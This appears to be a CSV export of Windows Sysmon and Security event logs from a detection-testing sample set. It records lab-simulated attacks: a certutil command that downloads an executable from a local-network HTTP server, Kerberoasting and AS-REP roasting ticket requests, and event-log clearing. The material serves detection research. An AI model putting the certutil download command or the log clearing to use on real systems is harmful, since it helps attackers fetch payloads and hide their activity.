AUTHORITY\\SYSTEM""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Personalization\\LockScreenImage\\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe""},{""@Name"":""Hashes"",""#text"":""MD5=E112A827FAB9F8378C76040187A6F336,SHA256=ED369187681A62247E38D930320F1CD771756D0B7B67072D8EC655EF99E14AEB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729""}]}}"
1,1339,2022-08-29 04:43:48.0156653,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,Process creation,DESKTOP-VQBONAV\user,,"ProcessID: 8636, ProcessGUID: 3e153517-4404-630c-0003-000000000400",RuleName: -,"MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43",ParentProcess: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"ParentProcessID: 8960, ParentProcessGUID: 3e153517-43c6-630c-f202-000000000400","ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","""C:\Windows\system32\certutil.exe"" -urlcache -split -f http://192.168.158.128:8000/calc.exe C:\Users\user\Desktop\calc.exe",False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.012""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\certutil.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.18362.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""CertUtil.exe""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CertUtil.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\certutil.exe\"" -urlcache -split -f http://192.168.158.128:8000/calc.exe C:\\Users\\user\\Desktop\\calc.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\user\\""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""LogonGuid"",""#text"":""3e153517-1483-630c-3e62-010000000000""},{""@Name"":""LogonId"",""#text"":""0x1623E""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43""},{""@Name"":""ParentProcessGuid"",""#text"":""3e153517-43c6-630c-f202-000000000400""},{""@Name"":""ParentProcessId"",""#text"":""8960""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" ""},{""@Name"":""ParentUser"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
2,1340,2022-08-29 04:43:48.0166186,10,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,ProcessAccess,SourceUser: DESKTOP-VQBONAV\user | TargetUser: DESKTOP-VQBONAV\user,,,GrantedAccess: Unknown code (0x1FFFFF),"SourceProcessID: 8960, SourceProcessGUID: ",SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"TargetProcessID: 8636, TargetProcessGUID: ",TargetImage: C:\Windows\system32\certutil.exe,CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d8d4|C:\Windows\System32\KERNELBASE.dll+5e4c0|C:\Windows\System32\KERNELBASE.dll+5c056|C:\Windows\System32\KERNEL32.DLL+1be93|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+383236|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+2c3809|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+2c3179|UNKNOWN(00007FFCF689D134),False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.007""},{""@Name"":""SourceProcessGUID"",""#text"":""3e153517-43c6-630c-f202-000000000400""},{""@Name"":""SourceProcessId"",""#text"":""8960""},{""@Name"":""SourceThreadId"",""#text"":""5048""},{""@Name"":""SourceImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetProcessGUID"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""TargetProcessId"",""#text"":""8636""},{""@Name"":""TargetImage"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""GrantedAccess"",""#text"":""0x1FFFFF""},{""@Name"":""CallTrace"",""#text"":""C:\\Windows\\SYSTEM32\\ntdll.dll+9d8d4|C:\\Windows\\System32\\KERNELBASE.dll+5e4c0|C:\\Windows\\System32\\KERNELBASE.dll+5c056|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+383236|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+2c3809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+2c3179|UNKNOWN(00007FFCF689D134)""},{""@Name"":""SourceUser"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""TargetUser"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
3,1341,2022-08-29 04:43:48.1285072,27,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""ImageBlock""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.117""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\02E7958E9A9619FDA0A027756E601291""},{""@Name"":""Hashes"",""#text"":""MD5=E112A827FAB9F8378C76040187A6F336,SHA256=ED369187681A62247E38D930320F1CD771756D0B7B67072D8EC655EF99E14AEB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729""}]}}"
4,1342,2022-08-29 04:43:48.1808981,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,FileCreate,DESKTOP-VQBONAV\user,,"ProcessID: 8636, ProcessGUID: 3e153517-4404-630c-0003-000000000400",RuleName: EXE,Image: C:\Windows\system32\certutil.exe,TargetFilename: C:\Users\user\AppData\Local\Microsoft\Windows\INetCache\IE\NZ19LUSG\calc[1].exe,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\NZ19LUSG\\calc[1].exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
5,1343,2022-08-29 04:43:48.1835647,27,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""ImageBlock""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\NZ19LUSG\\calc[1].exe""},{""@Name"":""Hashes"",""#text"":""MD5=E112A827FAB9F8378C76040187A6F336,SHA256=ED369187681A62247E38D930320F1CD771756D0B7B67072D8EC655EF99E14AEB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729""}]}}"
6,1344,2022-08-29 04:43:48.1857743,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,FileCreate,DESKTOP-VQBONAV\user,,"ProcessID: 8636, ProcessGUID: 3e153517-4404-630c-0003-000000000400",RuleName: EXE,Image: C:\Windows\system32\certutil.exe,TargetFilename: C:\Users\user\Desktop\calc.exe,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\Desktop\\calc.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
7,1345,2022-08-29 04:43:48.1870892,27,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""ImageBlock""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\Desktop\\calc.exe""},{""@Name"":""Hashes"",""#text"":""MD5=E112A827FAB9F8378C76040187A6F336,SHA256=ED369187681A62247E38D930320F1CD771756D0B7B67072D8EC655EF99E14AEB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729""}]}}"
1,38677,2021-04-29 09:23:54.2442261,1102,Info,Microsoft-Windows-Eventlog,Security,324,884,DC-Server-1.labcorp.local,0,,Event log cleared,LABCORP\Administrator,,SID: (S-1-5-21-2662618741-3450174888-1698379039-500),,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-2662618741-3450174888-1698379039-500"",""SubjectUserName"":""Administrator"",""SubjectDomainName"":""LABCORP"",""SubjectLogonId"":""0x88324""}}}"
2,38678,2021-04-29 09:23:58.6908657,4776,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1632,DC-Server-1.labcorp.local,0,,NTLM authentication request,,,Target: Alice,"Workstation: ",Status: Status OK,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""PackageName"",""#text"":""MICROSOFT_AUTHENTICATION_PACKAGE_V1_0""},{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""Workstation""},{""@Name"":""Status"",""#text"":""0x0""}]}}"
3,38679,2021-04-29 09:23:58.6910900,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1632,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.200)",Target: LABCORP\Alice,LogonType 3,LogonId: 0x27D676,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0x27D676""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""NtLmSsp ""},{""@Name"":""AuthenticationPackageName"",""#text"":""NTLM""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""NTLM V2""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.200""},{""@Name"":""IpPort"",""#text"":""40316""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
4,38680,2021-04-29 09:23:58.7182392,4768,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1700,DC-Server-1.labcorp.local,0,,A Kerberos authentication ticket (TGT) was requested,,::ffff:192.168.1.200:55976,Target: LABCORP.LOCAL\Alice,ServiceName: krbtgt,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-502,TicketEncryptionType: RC4-HMAC,Status: KDC_ERR_NONE - No error - No errors were found.,PreAuthType: PA-ENC-TIMESTAMP - This type is normal for standard password authentication.,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""ServiceName"",""#text"":""krbtgt""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-502""},{""@Name"":""TicketOptions"",""#text"":""0x50800000""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""TicketEncryptionType"",""#text"":""0x17""},{""@Name"":""PreAuthType"",""#text"":""2""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.200""},{""@Name"":""IpPort"",""#text"":""55976""},{""@Name"":""CertIssuerName""},{""@Name"":""CertSerialNumber""},{""@Name"":""CertThumbprint""}]}}"
5,38681,2021-04-29 09:23:58.7267239,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1632,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::ffff:192.168.1.200:55978,Target: LABCORP.LOCAL\Alice@LABCORP.LOCAL,ServiceName: sql101,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-2102,TicketEncryptionType: RC4-HMAC,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Alice@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""sql101""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-2102""},{""@Name"":""TicketOptions"",""#text"":""0x40810010""},{""@Name"":""TicketEncryptionType"",""#text"":""0x17""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.200""},{""@Name"":""IpPort"",""#text"":""55978""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""19aad67b-eada-e246-a523-b263eab9da60""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
6,38682,2021-04-29 09:23:58.7350760,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,656,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\Alice,LogonType 3,LogonId: 0x27D676,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0x27D676""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,37860,2021-04-29 07:55:53.4237616,1102,Info,Microsoft-Windows-Eventlog,Security,324,480,DC-Server-1.labcorp.local,0,,Event log cleared,LABCORP\Administrator,,SID: (S-1-5-21-2662618741-3450174888-1698379039-500),,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-2662618741-3450174888-1698379039-500"",""SubjectUserName"":""Administrator"",""SubjectDomainName"":""LABCORP"",""SubjectLogonId"":""0x778E00""}}}"
2,37861,2021-04-29 07:56:22.8869945,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC660C0,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC660C0""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
3,37862,2021-04-29 07:56:22.8874152,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC660C0,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC660C0""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54365""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
4,37863,2021-04-29 07:56:22.8909199,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC660C0,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC660C0""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
5,37864,2021-04-29 07:56:26.4337289,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::ffff:192.168.1.2:54634,Target: LABCORP.LOCAL\Bob@LABCORP.LOCAL,ServiceName: DC-SERVER-1$,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Bob@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC-SERVER-1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40800000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54634""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""45bf7c19-80f0-0327-a7d0-3d28cee31701""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
6,37865,2021-04-29 07:56:26.4359310,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\Bob (S-1-5-21-2662618741-3450174888-1698379039-1104),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC66373,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""SubjectUserName"",""#text"":""Bob""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC66373""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
7,37866,2021-04-29 07:56:26.4360541,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.2)",Target: LABCORP.LOCAL\Bob,LogonType 3,LogonId: 0xC66373,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC66373""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""1e230fd2-e649-64e2-d8cb-59308358c1ff""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54633""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
